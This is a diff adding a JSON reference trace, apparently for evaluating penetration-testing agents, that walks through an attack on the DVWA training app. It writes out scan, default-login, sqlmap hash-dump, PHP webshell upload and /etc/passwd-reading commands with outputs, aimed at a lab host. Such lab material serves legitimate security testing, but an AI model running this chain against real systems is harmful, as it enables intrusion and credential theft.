@@ -1,0 +1,110 @@
+{
+  "box": "DVWA",
+  "source": "Representative DVWA walkthrough constructed from the standard DVWA exercises (auth -> SQLi -> file upload webshell -> command exec). Author-constructed for offline Phase-1 / engagement dry-run; NOT a live capture. DVWA is the recommended FIRST live target (single web-app container).",
+  "abstract_family": "leak_authed_privesc",
+  "vulnhub_correspondence": "DVWA login (admin/password) -> SQLi on /vulnerabilities/sqli dumps the user hashes -> file-upload page drops a PHP webshell -> command execution as www-data -> read /etc/passwd.",
+  "target_label": "http://dvwa.lab",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target with nmap to find the web service.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- dvwa.lab",
+      "tool_output": "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n3306/tcp open mysql MySQL 5.5",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80", "mysql:3306"], "tech_stack": ["apache", "mysql"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web application technology.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://dvwa.lab/",
+      "tool_output": "http://dvwa.lab/ [200 OK] Apache[2.4.25], PHP[7.0], Title[Damn Vulnerable Web Application (DVWA)]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "php"]}
+    },
+    {
+      "step": 2,
+      "phase": "auth",
+      "actor_intent": "Log in to DVWA with the default admin credentials.",
+      "tool": "login",
+      "tool_command": "curl -c cookies.txt -d 'username=admin&password=password&Login=Login' http://dvwa.lab/login.php",
+      "tool_output": "HTTP/1.1 302 Found\nSet-Cookie: PHPSESSID=abc; path=/\nLocation: /index.php",
+      "reference_abstract_action": "auth_attempt",
+      "role": "admin",
+      "reference_state_after": {"auth_state": "admin"}
+    },
+    {
+      "step": 3,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate the vulnerability modules to find the SQLi and upload pages.",
+      "tool": "gobuster",
+      "tool_command": "gobuster dir -u http://dvwa.lab/vulnerabilities/ -w common.txt -b 403",
+      "tool_output": "/sqli                 (Status: 200)\n/upload               (Status: 200)\n/exec                 (Status: 200)",
+      "reference_abstract_action": "web_path_enumeration",
+      "reference_state_after": {"discovered_paths": ["/sqli", "/upload", "/exec"]}
+    },
+    {
+      "step": 4,
+      "phase": "input-discovery",
+      "actor_intent": "Inspect the SQLi page to find the id parameter.",
+      "tool": "curl",
+      "tool_command": "curl -s -b cookies.txt 'http://dvwa.lab/vulnerabilities/sqli/'",
+      "tool_output": "<form action='#' method='GET'><input type='text' name='id'><input type='submit' name='Submit' value='Submit'></form>",
+      "reference_abstract_action": "input_discovery",
+      "path": "/vulnerabilities/sqli/",
+      "reference_state_after": {"known_forms": ["form:/vulnerabilities/sqli/"], "known_parameters": ["/vulnerabilities/sqli/?id", "/vulnerabilities/sqli/?Submit"]}
+    },
+    {
+      "step": 5,
+      "phase": "exploit",
+      "actor_intent": "Exploit the SQL injection in the id parameter to dump the user hashes.",
+      "tool": "sqlmap",
+      "tool_command": "sqlmap -u 'http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie=... --dump -T users",
+      "tool_output": "parameter 'id' is injectable\nthe back-end DBMS is MySQL and is vulnerable\nDatabase: dvwa\nTable: users\n| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| gordonb | e99a18c428cb38d5f260853678922e03 |",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "dvwa_sqli",
+      "reference_state_after": {"verified_vulnerabilities": ["dvwa_sqli"]}
+    },
+    {
+      "step": 6,
+      "phase": "exploit",
+      "actor_intent": "Upload a PHP webshell through the file upload page.",
+      "tool": "upload",
+      "tool_command": "curl -b cookies.txt -F 'uploaded=@shell.php' -F 'Upload=Upload' http://dvwa.lab/vulnerabilities/upload/",
+      "tool_output": "../../hackable/uploads/shell.php succesfully uploaded!\nHTTP/1.1 200 OK",
+      "reference_abstract_action": "file_upload_attempt",
+      "yields_shell": true,
+      "reference_state_after": {"shell_state": "webshell"}
+    },
+    {
+      "step": 7,
+      "phase": "post-exploit",
+      "actor_intent": "Run id through the uploaded webshell to confirm execution.",
+      "tool": "shell",
+      "tool_command": "curl -b cookies.txt 'http://dvwa.lab/hackable/uploads/shell.php?cmd=id'",
+      "tool_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "web_user"},
+      "candidate_pool": [
+        "Run id through the uploaded webshell to confirm execution.",
+        "Log in to DVWA again with the default credentials.",
+        "Fingerprint the web application technology again.",
+        "Read the root flag with no root access."
+      ]
+    },
+    {
+      "step": 8,
+      "phase": "loot",
+      "actor_intent": "Read /etc/passwd through the webshell to enumerate users.",
+      "tool": "cat",
+      "tool_command": "curl -b cookies.txt 'http://dvwa.lab/hackable/uploads/shell.php?cmd=cat+/etc/passwd'",
+      "tool_output": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "etc_passwd",
+      "reference_state_after": {"read_files": ["etc_passwd"]}
+    }
+  ]
+}
